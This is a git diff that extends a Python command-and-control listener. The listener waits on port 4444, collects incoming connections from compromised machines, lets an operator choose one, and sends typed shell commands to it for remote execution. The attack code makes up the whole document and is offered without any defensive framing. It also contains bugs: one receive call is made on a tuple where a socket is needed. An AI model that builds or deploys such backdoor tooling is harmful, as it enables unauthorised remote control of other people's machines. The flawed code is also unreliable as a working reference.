@@ -22,8 +22,9 @@ class Listener:
 		self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.listener.bind((ip, port))
 
-		print("[+] Waiting for incoming connections")
+		self.chosen_connection = None
 
+		print("[+] Waiting for incoming connections")
 
 
 	def listen(self):
@@ -37,6 +38,31 @@ class Listener:
 		except: pass
 
 
+	def reliable_send(self, data):
+		if self.chosen_connection:
+			json_data = json.dumps(data)
+			self.chosen_connection[0].send(json_data.encode())
+		else:
+			print(colored("[-] You didn't choose any connection yet", "red"))
+
+
+	def reliable_recive(self):
+		json_data = ""
+		while True:
+			try:
+				json_data += self.chosen_connection.recv(1024).decode()
+				return json.loads(json_data)
+			except: continue
+
+
+	def execute_remotely(self, command):
+		self.reliable_send(command)
+		if command.split()[0] == "exit":
+			self.chosen_connection[0].close()
+			exit()
+		return self.reliable_recive()
+
+
 	def get_connections(self):
 		return self.connections
 
@@ -45,35 +71,67 @@ class Listener:
 		self.listener.close()
 
 
+	def run(self):
+		while True:
+			command = input(">>> ")
+
+			if command == "print":
+				connections = self.get_connections()
+				if connections:
+					for con in self.get_connections():
+						print(con[1])
+				else:
+					print(colored("[-] You didn't have any connection yet", "red"))
+
+			elif command == "choose":
+				connections = self.get_connections()
+				if connections:
+					for con in range(len(connections)):
+						connection = connections[con][1]
+						print(f"{str(con+1)}. {connection}")
+					chosen = input("Enter number of connection: ") 
+					if not chosen.isdigit():
+						print(colored("[~] You must to enter number!", "yellow"))
+					elif int(chosen) <= len(connections):
+						chosen = int(chosen)
+						self.chosen_connection = connections[chosen - 1]
+						print("[+] Chosen connection:", self.chosen_connection[1])
+					else:
+						print(colored("[-] This connection does not exist!"))
+				else:
+					print(colored("[-] You didn't have any connection yet", "red"))
+
+			elif command == "chosen":
+				if self.chosen_connection: 
+					print("[+] Chosen connection:", self.chosen_connection[1])
+				else: 
+					print(colored("[-] You didn't choose any connection yet", "red"))
+
+			elif command == "help":
+				help_message = colored("\n Type 'help' to see it\n\n", "yellow")
+				help_message += colored(" print", "green") + " - show all connections;\n"
+				help_message += colored(" choose", "green") + " - choose connection;\n"
+				help_message += colored(" exit", "red") + " - stop the program; \n"
+				print(help_message)
+
+			elif len(command.split()):
+				if self.chosen_connection:
+					result = self.execute_remotely(command)
+					print(result)
+
+				else: print(colored("[-] You didn't choose any connection yet", "red"))
+
+
+
 
 if __name__ == "__main__":
-	listener = Listener("192.168.0.199", 4444)
+	listener = Listener("192.168.0.108", 4444)
 
 	listen_thread = threading.Thread(target=listener.listen)
 	listen_thread.start()
 
-	while True:
-		command = input(">>> ")
-		if command == "exit":
-			listener.close()
-			break
-
-		if command == "print":
-			for con in listener.get_connections():
-				print(con[1])
-
-		if command == "choose":
-			connections = listener.get_connections()
-			for con in range(len(connections)):
-				connection = connections[con][1]
-				print(f"{str(con+1)}. {connection}")
-
-		if command == "help":
-			help_message = colored("\n Type 'help' to see it\n\n", "yellow")
-			help_message += colored(" print", "green") + " - show all connections;\n"
-			help_message += colored(" choose", "green") + " - choose connection;\n"
-			help_message += colored(" exit", "red") + " - stop the program; \n"
-			print(help_message)
-
+	listener.run()
+	print("alright")
+	listen_thread.join()
 
 
